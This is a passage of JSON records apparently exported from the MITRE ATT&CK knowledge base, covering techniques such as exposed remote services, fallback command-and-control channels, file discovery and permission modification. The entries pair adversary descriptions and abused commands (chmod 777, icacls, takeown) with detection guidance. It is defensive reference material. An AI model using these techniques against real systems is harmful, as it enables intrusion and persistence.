Bad Rabbit),(Citation: DFIR Ryuk's Return October 2020),(Citation: Kaspersky Flame),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: FireEye APT28),(Citation: LogRhythm WannaCry),(Citation: ClearSky Pay2Kitten December 2020),(Citation: MS17-010 March 2017),(Citation: SANS Conficker),(Citation: US-CERT Emotet Jul 2018),(Citation: Ars Technica Pwn2Own 2017 VM Escape),(Citation: TechNet Moving Beyond EMET),(Citation: Wikipedia Control Flow Integrity)"}
{"ID":"T1133","name":"External Remote Services","description":"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)","url":"https://attack.mitre.org/techniques/T1133","created":"31 May 2017","last modified":"30 March 2023","version":"2.4","tactics":"Initial Access, Persistence","detection":"Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\nWhen authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.","platforms":"Containers, Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Logon Session: Logon Session Metadata, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; Brad Geesaman, @bradgeesaman; Daniel Oakley; David Fiser, @anu4is, Trend Micro; David Tayouri; ExtraHop; Idan Frimark, Cisco; Jay Chen, Palo Alto Networks; Magno Logan, @magnologan, Trend Micro; Rory McCune, Aqua Security; Travis Smith, Tripwire; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team; Yuval Avrahami, Palo Alto Networks","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCSC APT29 July 2020),(Citation: ESET Telebots June 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: Secureworks REvil September 2019),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cisco Talos Intelligence Group),(Citation: DarkReading FireEye FIN5 Oct 2015),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Microsoft NICKEL December 2021),(Citation: Intezer Doki July 20),(Citation: FoxIT Wocao December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Aqua Kinsing April 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: RSA2017 Detect and Respond Adair),(Citation: Microsoft GALLIUM December 2019),(Citation: CISA AA20-301A Kimsuky),(Citation: US-CERT TA18-074A),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: Dell TG-3390),(Citation: FireEye TRITON 2019),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye Respond Webinar July 2017),(Citation: Unit 42 Hildegard Malware),(Citation: ESET BlackEnergy Jan 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: McAfee Night Dragon),(Citation: Intezer TeamTNT September 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: Anomali Linux Rabbit 2018),(Citation: Cycraft Chimera April 2020),"}
{"ID":"T1008","name":"Fallback Channels","description":"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.","url":"https://attack.mitre.org/techniques/T1008","created":"31 May 2017","last modified":"14 July 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT1 Appendix),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Team9 June 2020),(Citation: Mandiant APT1),(Citation: ClearSky Siamesekitten August 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: ESET PipeMon May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET InvisiMole June 2020),(Citation: Novetta Blockbuster RATs),(Citation: Symantec Linfo May 2012),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Check Point APT34 April 2021),(Citation: ESET Sednit Part 1),(Citation: ESET InvisiMole June 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Machete July 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye APT41 Aug 2019),(Citation: Fidelis Turbo),(Citation: Mythc Documentation),(Citation: FireEye APT30),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Novetta Blockbuster),(Citation: Unit 42 Kazuar May 2017),(Citation: Kaspersky Lyceum October 2021),(Citation: ANSSI Sandworm January 2021),(Citation: OilRig ISMAgent July 2017),(Citation: Unit 42 QUADAGENT July 2018),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: McAfee Night Dragon),(Citation: DustySky),(Citation: ESET Sednit Part 2),(Citation: Talos TinyTurla September 2021),(Citation: ESET Crutch December 2020),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cylance Dust Storm),(Citation: ESET Dukes October 2019),(Citation: Unit42 RDAT July 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Unit 42 Valak July 2020),(Citation: ESET Ebury Oct 2017),(Citation: Securelist MiniDuke Feb 2013),(Citation: University of Birmingham C2)"}
{"ID":"T1083","name":"File and Directory Discovery","description":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)","url":"https://attack.mitre.org/techniques/T1083","created":"31 May 2017","last modified":"30 March 2023","version":"1.5","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001). Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to gather file and directory information with built-in features native to the network device platform.  Monitor CLI activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.  ","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":"Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talent-Jump Clambling February 2020),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: Fysbis Dr Web Analysis),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: FireEye APT17),(Citation: objsee mac malware 2017),(Citation: sentinelone shlayer to zshlayer),(Citation: Leonardo Turla Penquin May 2020),(Citation: Talos Promethium June 2020),(Citation: objective-see windtail1 dec 2018),(Citation: KISA Operation Muzabi),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Kaspersky Sofacy),(Citation: Symantec Orangeworm April 2018),(Citation: Securelist APT10 March 2021),(Citation: Symantec Sowbug Nov 2017),(Citation: Application Bundle Manipulation Brandon Dalton),(Citation: Check Point APT34 April 2021),(Citation: Palo Alto MoonWind March 2017),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit 42 WhisperGate January 2022),(Citation: GitHub Sliver File System August 2021),(Citation: CISA SoreFang July 2016),(Citation: CIRCL PlugX March 2013),(Citation: Symantec Remsec IOCs),(Citation: Palo Alto Rover),(Citation: FireEye admin@338),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Arxiv Avaddon Feb 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Proofpoint TA416 Europe March 2022),(Citation: ATT QakBot April 2021),(Citation: Deep Instinct Black Basta August 2022),(Citation: ASERT InnaputRAT April 2018),(Citation: Talos ZxShell Oct 2014),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET Attor Oct 2019),(Citation: ESET Zebrocy May 2019),(Citation: Medium S2W WhisperGate January 2022),(Citation: LogRhythm WannaCry),(Citation: Avertium Black Basta June 2022),(Citation: F-Secure Cosmicduke),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Cyble Black Basta May 2022),(Citation: McAfee Sodinokibi October 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: Cybereason Bazar July 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: PWC KeyBoys Feb 2017),(Citation: ESET Operation Groundbait),(Citation: Rclone),(Citation: Microsoft WhisperGate January 2022),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Camba RARSTONE),(Citation: Unit 42 BackConfig May 2020),(Citation: Gigamon Berserk Bear October 2021),(Citation: ESET DazzleSpy Jan 2022),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: FireEye FiveHands April 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Dragos Crashoverride 2018),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: Securelist MuddyWater Oct 2018),(Citation: Symantec Leafminer July 2018),(Citation: ATT Sidewinder January 2021),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: CME Github September 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Fidelis njRAT June 2013),(Citation: NCSC Cyclops Blink February 2022),(Citation: F-Secure BlackEnergy 2014),(Citation: GitHub PoshC2),(Citation: NHS UK BLINDINGCAN Aug 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Unit 42 PingPull Jun 2022),(Citation: McAfee Night Dragon),(Citation: Microsoft Actinium February 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: US-CERT Bankshot Dec 2017),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: Talos Bisonal Mar 2020),(Citation: Lotus Blossom Jun 2015),(Citation: Palo Alto Networks BBSRAT),(Citation: Trend Micro Muddy Water March 2021),(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Forcepoint Monsoon),(Citation: FireEye APT41 March 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Babuk February 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Qualys LolZarus),(Citation: Talos Oblique RAT March 2021),(Citation: Volexity PowerDuke November 2016),(Citation: Accenture Dragonfish Jan 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: FireEye Clandestine Fox),(Citation: FireEye WannaCry 2017),(Citation: ESET Industroyer),(Citation: Dell TG-3390),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: ASERT Donot March 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Securelist ScarCruft May 2019),(Citation: FireEye Periscope March 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: US-CERT Volgmer Nov 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Überwachung APT28 Forfiles June 2015),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Kaspersky Turla Aug 2014),(Citation: JPCert PLEAD Downloader June 2018),(Citation: US-CERT TA18-074A),(Citation: Kaspersky MoleRATs April 2019),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Talos Lokibot Jan 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: Cymmetria Patchwork),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Royal Linux ESXi February 2023),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talos Konni May 2017),(Citation: Aqua Kinsing April 2020),(Citation: Riskiq Remcos Jan 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Korean FSI TA505 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Lunghi Iron Tiger Linux),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: JPCert TSCookie March 2018),(Citation: Zscaler Kasidet),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Secureworks Karagany July 2019),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: Cisco Talos Intelligence Group),(Citation: CrowdStrike Ryuk January 2019),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Unit 42 Gamaredon February 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Microsoft POLONIUM June 2022),(Citation: Rancor Unit42 June 2018),(Citation: Uptycs Black Basta ESXi June 2022),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT30),(Citation: Baumgartner Naikon 2015),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: CISA AA20-296A Berserk Bear December 2020),(Citation: CarbonBlack Conti July 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Lazarus APT January 2022),(Citation: Kaspersky TajMahal April 2019),(Citation: Securelist Remexi Jan 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Eset Ramsay May 2020),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: FBI FLASH APT39 September 2020),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Kaspersky Winnti April 2013),(Citation: Volexity SolarWinds),(Citation: FireEye APT10 April 2017),(Citation: Kroll Royal Deep Dive February 2023),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Intezer Doki July 20),(Citation: McAfee Cuba April 2021),(Citation: Securelist Octopus Oct 2018),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Fidelis Turbo),(Citation: evolution of pirpi),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: ESET ForSSHe December 2018),(Citation: FinFisher Citation),(Citation: Accenture MUDCARP March 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: IBM MegaCortex),(Citation: Kaspersky Turla),(Citation: CrowdStrike IceApple May 2022),(Citation: Cylance Dust Storm),(Citation: Securelist Dtrack),(Citation: Symantec Inception Framework March 2018),(Citation: Cylance Machete Mar 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Novetta Winnti April 2015),(Citation: Symantec Frutas Feb 2013),(Citation: Talos GravityRAT),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Carbon Black HotCroissant April 2020),(Citation: MSTIC FoggyWeb September 2021),(Citation: F-Secure The Dukes),(Citation: Securelist Sofacy Feb 2018),(Citation: Unit42 Azorult Nov 2018),(Citation: GitHub Pupy),(Citation: McAfee GhostSecret),(Citation: NCC Group Black Basta June 2022),(Citation: XAgentOSX 2017),(Citation: Secureworks REvil September 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: TrendMicro macOS Dacls May 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Cybereason Oceanlotus May 2017),(Citation: FoxIT Wocao December 2019),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: ESET Okrum July 2019),(Citation: TechNet Dir),(Citation: Github PowerShell Empire),(Citation: FireEye APT37 Feb 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET Gamaredon June 2020),(Citation: Group IB GrimAgent July 2021),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: NCC Group Team9 June 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: McAfee Gold Dragon),(Citation: TrendMicro BlackTech June 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: McAfee Honeybee),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto DNS Requests),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Avira Mustang Panda January 2020),(Citation: Symantec Pasam May 2012),(Citation: FireEye EPS Awakens Part 2),(Citation: FireEye MESSAGETAP October 2019),(Citation: Bitdefender APT28 Dec 2015),(Citation: CrowdStrike Putter Panda),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ESET Dukes October 2019),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky Sodin July 2019),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: ESET Sednit USBStealer 2014),(Citation: Security Affairs DustSquad Oct 2018),(Citation: ZScaler Hacking Team),(Citation: Trend Micro KillDisk 2),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Novetta Blockbuster),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Cylance Sodinokibi July 2019),(Citation: objective-see windtail2 jan 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: 360 Machete Sep 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: Check Point Black Basta October 2022),(Citation: Trend Micro Skidmap),(Citation: Symantec Cicada November 2020),(Citation: Novetta-Axiom),(Citation: Symantec Linfo May 2012),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Cybereason Royal December 2022),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT32 May 2017),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Talos Smoke Loader July 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: ESET ComRAT May 2020),(Citation: DustySky),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Talos PoetRAT April 2020),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: NCC Group Fivehands June 2021),(Citation: ESET Ebury Oct 2017),(Citation: Trend Micro Ransomware February 2021),"}
{"ID":"T1222","name":"File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ","url":"https://attack.mitre.org/techniques/T1222","created":"17 October 2018","last modified":"19 October 2022","version":"2.2","tactics":"Defense Evasion","detection":"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)","platforms":"Linux, Windows, macOS","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"File system access controls","contributors":"CrowdStrike Falcon OverWatch; Jan Miller, CrowdStrike","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: create_sym_links)"}
{"ID":"T1222.002","name":"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ","url":"https://attack.mitre.org/techniques/T1222/002","created":"04 February 2020","last modified":"13 September 2021","version":"1.1","tactics":"Defense Evasion","detection":"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, and <code>chmod 777</code>.(Citation: 20 macOS Common Tools and Techniques) \n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1222","defenses bypassed":null,"contributors":null,"permissions required":"root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CheckPoint Dok),(Citation: Aqua Kinsing April 2020),(Citation: ANSSI Sandworm January 2021),(Citation: Cisco Talos Intelligence Group),(Citation: Uptycs Black Basta ESXi June 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Leonardo Turla Penquin May 2020),(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: ESET OceanLotus macOS April 2019),(Citation: Anomali Rocke March 2019),(Citation: Trend Micro TeamTNT),"}
{"ID":"T1222.001","name":"File and Directory Permissions Modification: Windows File and Directory Permissions Modification","description":"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).","url":"https://attack.mitre.org/techniques/T1222/001","created":"04 February 2020","last modified":"21 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 